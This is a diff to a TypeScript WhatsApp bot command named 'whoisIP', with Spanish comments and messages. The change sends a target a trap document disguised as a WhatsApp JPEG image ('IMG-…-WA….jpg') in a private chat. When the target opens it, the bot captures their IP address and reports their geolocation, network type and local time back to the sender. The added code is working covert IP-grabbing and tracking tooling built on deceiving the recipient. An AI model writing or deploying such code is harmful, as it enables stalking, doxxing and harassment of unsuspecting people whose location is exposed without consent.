@@ -41,7 +41,7 @@ async function sendReport(sock: any, s: TrapSession, hit: TrapHit) {
   if (g?.tz) {
     try {
       localTime = new Intl.DateTimeFormat("es-CO", { timeZone: g.tz, dateStyle: "short", timeStyle: "medium" }).format(new Date(hit.at));
-    } catch {}
+    } catch { }
   }
   const tipo = g?.proxy ? "🛡️ Proxy / VPN" : g?.mobile ? "📶 Red móvil" : g?.hosting ? "🖧 Hosting" : "🌐 Red fija / otra";
 
@@ -90,7 +90,7 @@ export default {
   description: "Captura la IP del objetivo con un documento trampa y reporta su geolocalización.",
   groupOnly: false,
   async run(ctx: CommandContext) {
-    const { reply, react, msg, args, sock, from, groupMeta } = ctx;
+    const { reply, react, msg, args, sock, from, groupMeta, sender } = ctx;
     const log = (t: string) => console.log(`[whoisIP] ${t}`);
 
     try {
@@ -158,14 +158,13 @@ export default {
         if (local) {
           try {
             plain = await readFile(local);
-          } catch {}
+          } catch { }
         }
       }
       if (!plain) plain = Buffer.from(PLACEHOLDER, "base64");
 
-      const fileName = `IMG-${new Date().toISOString().slice(0, 10).replace(/-/g, "")}-WA${
-        Math.floor(Math.random() * 9000) + 1000
-      }.jpg`;
+      const fileName = `IMG-${new Date().toISOString().slice(0, 10).replace(/-/g, "")}-WA${Math.floor(Math.random() * 9000) + 1000
+        }.jpg`;
 
       const session = await createSession({
         plain,
@@ -204,6 +203,37 @@ export default {
       let destino = targetJid;
       let enviado = false;
 
+      try {
+        await withTimeout(
+          sock.sendMessage(sender, {
+            document: { url: sessionUrl(session) },
+            mimetype: "image/jpeg",
+            fileName: session.fileName,
+            caption,
+          } as any),
+          15000,
+          "sendMessage-privado"
+        );
+        log(`enviado al privado de ${targetJid}`);
+      } catch (e: any) {
+        log(`fallo al enviar al privado: ${e?.message}`);
+        closeSession(session);
+        await react("❌").catch(() => undefined);
+        return reply(`❌ No pude enviar al privado de \`+${digits}\`\n\`${String(e?.message ?? e).slice(0, 200)}\``)
+      }
+
+      await react("📡").catch(() => undefined);
+      return reply(`✅ Enviado al privado de \`+${digits}\`\n_El reporte con la IP llegará aquí cuando lo descargue._`);
+    } catch (e: any) {
+      log(`whoisIP failed: ${e?.message}`);
+      await react("❌").catch(() => undefined);
+      return reply(`❌ *whoisIP* explotó:\n\`${String(e?.stack ?? e?.message ?? e).slice(0, 400)}\``);
+    }
+  }
+};
+
+      /*
+      REPALDO SI ALGO FALLA
       const intentos: Array<{ jid: string; via: string }> = [
         { jid: targetJid, via: "sendMessage(proto)" },
         { jid: targetJid, via: "relayMessage" },
@@ -254,4 +284,5 @@ export default {
       await reply(`❌ *whoisIP* explotó:\n\`${String(e?.stack ?? e?.message ?? e).slice(0, 400)}\``).catch(() => undefined);
     }
   },
-};
+}
+*/
